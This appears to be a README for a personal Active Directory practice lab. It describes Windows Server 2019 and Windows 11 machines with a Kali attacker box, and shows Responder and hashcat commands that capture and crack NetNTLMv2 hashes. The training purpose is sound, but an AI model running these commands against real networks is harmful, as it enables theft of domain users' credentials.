# Active Directory Lab

## Overview

This is a personal Active Directory lab built to practice common enterprise attack techniques in a controlled environment.

The lab currently consists of a Windows Domain Controller with domain users and service accounts. It is designed to simulate common AD security weaknesses and provide a practical environment for testing enumeration, credential attacks, lateral movement and privilege escalation techniques.

This page provides a quick overview of some of the techniques currently tested within the lab.

> Note: This is a small demonstration of the lab's current capabilities. I intend to expand it further by adding more users, machines, network segmentation for pivoting practice, and additional vulnerabilities to better simulate a real enterprise environment.

---

# Lab Environment

| Machine | Role | Operating System |
|---|---|---|
| WINDOWS-DC | Domain Controller | Windows Server 2019 |
| CLIENT1 | Domain Workstation | Windows 11 |
| KALI | Attacker Machine | Kali Linux |

Domain: DOMAIN.local

---

# Lab Scenarios

## Host Discovery & Enumeration



## NTLM Credential Capture & Cracking

Using Responder, an attacker can capture NetNTLMv2 authentication hashes when a user is tricked into authenticating to a malicious service.

### Start Responder
```
sudo responder -I eth0 -dwv
```
### Identify Captured Hash

![responder](Images/responder.png)

### Identify Hash Type
```
hashid admin.hash
```

![hashid](Images/hashid.png)

Finding hashcat mode:
```
hashcat -h | grep NTLM
```

![mode](Images/mode.png)

### Crack NeNTLMv2 Hash

NetNTLMv2 hashes can be cracked using Hashcat:
```
hashcat -m 5600 admin.hash /usr/share/wordlists/rockyou.txt
```

![administrator](Images/administrator.png)
